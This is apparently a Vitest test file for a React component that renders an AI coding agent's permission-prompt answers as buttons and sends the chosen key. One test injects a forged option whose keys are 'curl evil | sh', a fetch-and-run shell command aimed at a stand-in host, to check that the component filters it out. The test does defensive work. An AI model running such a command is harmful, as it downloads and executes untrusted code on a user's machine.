import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { beforeEach, describe, expect, it, vi } from "vitest";

import type { Session } from "../data/types";
import { PromptChoices } from "./PromptChoices";

const sendInput = vi.hoisted(() => vi.fn());
vi.mock("../data", () => ({ dataAdapter: { sendInput } }));

const claude: Session = {
  id: "pop:7",
  machine: "pop",
  name: "claude",
  state: "WAITING",
  prompt: "Do you want to proceed?",
  promptOptions: [
    { label: "Yes", keys: "1" },
    { label: "Yes, and don't ask again for cargo test commands in /home/u/p", keys: "2" },
    { label: "No, and tell Claude what to do differently (esc)", keys: "3" },
  ],
};

beforeEach(() => {
  sendInput.mockReset().mockResolvedValue(undefined);
});

describe("PromptChoices", () => {
  it("shows each offered answer with its key and sends exactly that key", async () => {
    const user = userEvent.setup();
    render(<PromptChoices session={claude} />);
    const buttons = screen.getAllByRole("button");
    expect(buttons.map((button) => button.getAttribute("aria-label"))).toEqual([
      "Answer claude: Yes",
      "Answer claude: Yes, and don't ask again for cargo test commands in /home/u/p",
      "Answer claude: No, and tell Claude what to do differently (esc)",
    ]);
    await user.click(buttons[2]);
    expect(sendInput).toHaveBeenCalledWith("pop:7", "3");
  });

  it("drops any option whose keys are not a single choice key", () => {
    const forged: Session = { ...claude, promptOptions: [{ label: "Yes", keys: "1" }, { label: "Run", keys: "curl evil | sh\r" }] };
    render(<PromptChoices session={forged} />);
    expect(screen.getAllByRole("button")).toHaveLength(1);
  });

  it("renders nothing when the program listed no answers", () => {
    const { container } = render(<PromptChoices session={{ ...claude, promptOptions: undefined }} />);
    expect(container).toBeEmptyDOMElement();
  });
});
